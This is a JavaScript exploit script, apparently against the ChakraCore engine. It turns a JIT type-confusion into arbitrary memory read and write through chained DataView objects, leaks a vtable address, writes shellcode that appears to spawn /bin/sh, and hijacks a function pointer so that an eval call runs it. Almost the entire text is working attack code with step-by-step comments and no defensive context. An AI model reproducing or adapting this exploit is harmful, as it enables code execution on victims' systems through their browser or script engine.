obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;
dv1 = new DataView(new ArrayBuffer(0x100));
dv2 = new DataView(new ArrayBuffer(0x100));
BASE = 0x100000000;
function hex(x) {
    return "0x" + x.toString(16);
}
function opt(o, c, value) {
    o.b = 1;
    let tmp = {__proto__: c};
    o.a = value;
}
function main() {
    for (let i = 0; i < 10000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }
    let o = {a: 1, b: 2};
    let cons = function () {};
    cons.prototype = o;
    opt(o, o, obj); // o->auxSlots = obj (Step 1)
    o.c = dv1; // obj->auxSlots = dv1 (Step 2)
    obj.h = dv2; // dv1->buffer = dv2 (Step 3)
    let read64 = function(addr_lo, addr_hi) {
        // dv2->buffer = addr (Step 4)
        dv1.setUint32(0x38, addr_lo, true);
        dv1.setUint32(0x3C, addr_hi, true);
        // read from addr (Step 5)
        return dv2.getInt32(0, true) + dv2.getInt32(4, true) * BASE;
    }
    let write64 = function(addr_lo, addr_hi, value_lo, value_hi) {
        // dv2->buffer = addr (Step 4)
        dv1.setUint32(0x38, addr_lo, true);
        dv1.setUint32(0x3C, addr_hi, true);
        // write to addr (Step 5)
        dv2.setInt32(0, value_lo, true);
        dv2.setInt32(4, value_hi, true);
        //print("FUCK");
    }
    // get dv2 vtable pointer
    vtable_lo = dv1.getUint32(0, true);
    vtable_hi = dv1.getUint32(4, true);
    print(hex(vtable_lo + vtable_hi * BASE));
    // read first vtable entry using the RW primitive
    leak = read64(vtable_lo, vtable_hi);
    print("Try to leak");
    print(hex(leak));
    shellcode_lo = vtable_lo+(0xf4a3d790-0xf49e96e0);
    shellcode_hi = vtable_hi;
    write64(shellcode_lo+0x00, shellcode_hi, 0x90909090, 0x90909090);
    write64(shellcode_lo+0x08, shellcode_hi, 0xb848686a, 0x6e69622f);
    write64(shellcode_lo+0x10, shellcode_hi, 0x732f2f2f, 0xe7894850);
    write64(shellcode_lo+0x18, shellcode_hi, 0x01697268, 0x24348101);
    write64(shellcode_lo+0x20, shellcode_hi, 0x01010101, 0x6a56f631);
    write64(shellcode_lo+0x28, shellcode_hi, 0x01485e08, 0x894856e6);
    write64(shellcode_lo+0x30, shellcode_hi, 0x6ad231e6, 0x050f583b);
    print("Shellcode injected");
    vtable2_lo = vtable_lo+(0xf4a38010-0xf49e96e0);
    vtable2_hi = vtable_hi;
    write64(vtable2_lo, vtable2_hi, shellcode_lo, shellcode_hi);
    print("Shellcode linked");
    print("dl_runtime_resolve in libcChakraCore.got -> shellcode");
    eval("1+2");
}
main();
EOF